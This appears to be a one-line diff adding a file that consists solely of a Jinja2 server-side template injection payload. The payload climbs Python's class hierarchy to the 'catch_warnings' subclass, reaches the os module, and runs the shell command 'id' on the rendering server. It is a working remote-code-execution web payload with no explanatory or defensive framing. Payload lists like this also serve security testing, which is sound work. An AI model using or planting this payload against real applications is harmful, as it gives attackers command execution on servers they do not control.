@@ -1,0 +1,1 @@
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ =='catch_warnings' %}{{c.__init__.func_globals['linecache'].__dict__['os'].popen("id").read()}}{% endif %}{% endfor %}
